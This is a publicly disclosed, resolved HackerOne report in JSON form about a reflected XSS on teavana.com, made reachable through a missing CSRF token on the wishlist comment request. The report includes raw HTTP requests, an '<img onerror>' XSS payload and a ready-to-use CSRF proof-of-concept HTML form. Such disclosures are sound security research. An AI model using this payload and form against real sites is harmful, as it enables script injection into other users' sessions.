{
  "id": 177508,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzc1MDg=",
  "url": "https://hackerone.com/reports/177508",
  "title": "Reflected XSS by exploiting CSRF vulnerability on teavana.com wishlist comment module. (wishlist-comments)",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2016-10-22T10:40:41.332Z",
  "submitted_at": "2016-10-22T10:40:41.332Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "faisalahmed",
    "url": "/faisalahmed",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1989,
    "url": "https://hackerone.com/starbucks",
    "handle": "starbucks",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Starbucks",
      "twitter_handle": "Starbucks",
      "website": "http://www.starbucks.com",
      "about": "Premier purveyor of the finest coffee in the world, inspiring and nurturing the human spirit â€” one person, one cup and one neighborhood at a time."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-02-13T22:48:34.665Z",
  "bug_reporter_agreed_on_going_public_at": "2017-02-09T10:11:49.783Z",
  "team_member_agreed_on_going_public_at": "2017-02-13T22:48:34.625Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "User can add comments on their wishlist item. The http request which adds comment on wishlist item, looks like:\n\n```http\nPOST /on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id HTTP/1.1\nHost: www.teavana.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.teavana.com/us/en/my-wishlist\nContent-Length: 55\nCookie: REDACTED\nConnection: close\n\nwishlistComment=:comment_string\n```\nThe value of the `wishlistComment` reflects on the returned HTML snippet as bellow:\n\n```html\n<textarea maxlength=\"150\" onkeyup=\"return ismaxlength(this);\" id=\"wishlistComment\" name=\"wishlistComment\" cols=\"60\" rows=\"12\">\n:comment_string\n</textarea>\n```\n\nBut the returned string is not sanitized. As a result if user submits html/javascript payload as the value, that payload will return and will cause javascript execution.\n\n**vulnerable post**\n```http\nPOST /on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id HTTP/1.1\nHost: www.teavana.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.teavana.com/us/en/my-wishlist\nContent-Length: 55\nCookie: REDACTED\nConnection: close\n\nwishlistComment=</textarea><img+src=x+onerror=alert(1)>\n```\n**Response**\n```html\n<textarea maxlength=\"150\" onkeyup=\"return ismaxlength(this);\" id=\"wishlistComment\" name=\"wishlistComment\" cols=\"60\" rows=\"12\">\n</textarea><img src=x onerror=alert(1)>\n</textarea>\n```\n\nThere is no csrf token tied with the comment adding post request. As a result this csrf flaw can make the self-xss as a global reflected xss.\n\n**CSRF to XSS PoC**\n\n```html\n<html>\n  <body>\n    <form action=\"https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id\" method=\"POST\">\n      <input type=\"hidden\" name=\"wishlistComment\" value=\"&lt;&#47;textarea&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;1&#41;&gt;\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n```\n\nReplace the `:id` with your wishlist id (ex: C1005285074). This will execute the javascript and will popup an alert box.\n\n{F129593}",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 129593,
      "file_name": "xssed.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/129/593/16ee0d3eb0e307e56f9ac3c91db6a3fe210261f1/xssed.png?response-content-disposition=attachment%3B%20filename%3D%22xssed.png%22%3B%20filename%2A%3DUTF-8%27%27xssed.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYHMKEKRC%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T233800Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDJMPTJY2Ir2MOCLrdRMnnjxUpuyBJjyMSNuEDmlSHuBAIhANPVh52Ag0ZhlNPMGw44%2B0wevQudlqNF3Xg6fRQMKiFjKrEFCB4QAxoMMDEzNjE5Mjc0ODQ5IgyIhbXp9Yg8uGlqM1QqjgWWsiaoe3I%2BSF7WxGq8IIhnVidUmZ%2F8C%2FhUgt8ldnpR11DICo9gXh0RZgZsnCVexOzrGuHMb16wqqfd8WQOAoJlOV1x72U3%2B6rjq0CLxhNhln%2FfEHgG31Sr7%2FrDSk3RKRGFOBTJWAQoAjFJnTJuZZ8iB6fayGRovsupR4yLVzJA83j8cj2n%2BEB%2Bs53pwmSpAq8rxnz9u4FIa%2B3%2BfIo05PSkTgHzWzRNNmC2o71Rc%2Bb2rYR1nDD4gGSurav%2FbrG%2FKpRrZI1V8pjr6ExTqDkyBeVD9na1ElVsFCY857mdjS9FXEqdmhf%2BauA0xpXkIVGF53wiSv5M%2BVNtV2%2BfzkFOQrz7F2ye5ED0%2BZ6yMxfoXzdGfqNIR0mtJRPYOVS%2FIDmrs98mPLHMrVXdW3BI8V876%2FdPUYJWumYigNynQ4CgDn67p%2BDNnV9A9PCEkb8ncroo3bqlhL9xtNhjcoUOmlDFKZ9IW046vzLFM3hY6nDX%2FCGFqZPvpyrCeukGZaMVhzsu0m%2BiOPpKkP0I2KiTJLiH0QfvqeKiuBPcpA9A%2BDjFlpMjYm%2BmrUjsJBj8I817PdjmifBAvJJBZmnzBHNtX3XpDWFTN2%2B8YdDSs4JnQce8cQ%2FgSll5wEqYAPGEbVXj6ZX4SZbwbRSt1fdPF7nhRAj92J9CBe4hyri7YYmVEBPuWtxdIp9oNOf7YIgBOYjxy4e5o4OEa2pen31rGqhCRXu1Rv5nDd8oHsji4cDy1xxQfASYHC9jkNHYaHFmKHs0RBVGQdEXa01q9t6Yt%2FMn80NulQaE5nqUuk%2F4YzOoe9CA%2FjeqNxMbnyk58tWVucpohqQeX0MQehKQ8cOvtjAEC63wZYyXpl6tTQY8Q0abSfPrtrUwv8%2FBxgY6sAF3RlFkBTDPOiSRIxQuSZc%2Fd3HVNzgDeHk03X20ZUfQXfQbd%2FlCxpmIFwoHLwWD4ZKv9oYtwyy0uSPXTyoVz3O7mwEOTOrq182tY%2BpcE%2BBDUfzyADgimUIfFAHPkQpe55dbUMq26YP4UOyD3TlXhsW%2B6SLeClfDefdoqWzRKCd29rzU9kQf7VFClo4z4bQhRTCB3Q9QmM9aLDYvrVAvrBiR5wn5y%2BiT%2BlODJolyFTOmRA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7d5af169e035cb5e82cd70842404dd829e90a542f05245fd785ac9ae3892042e",
      "file_size": 1237626,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2017-03-11T10:11:49.821Z",
  "allow_singular_disclosure_after": -269270770.24537116,
  "singular_disclosure_allowed": true,
  "vote_count": 25,
  "voters": [
    "cxzer0",
    "hunter",
    "tripwire",
    "fizhimchik",
    "spam404",
    "jon_bottarini",
    "mpz",
    "eveeez",
    "khizer47",
    "sup3r-b0y",
    "and 15 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
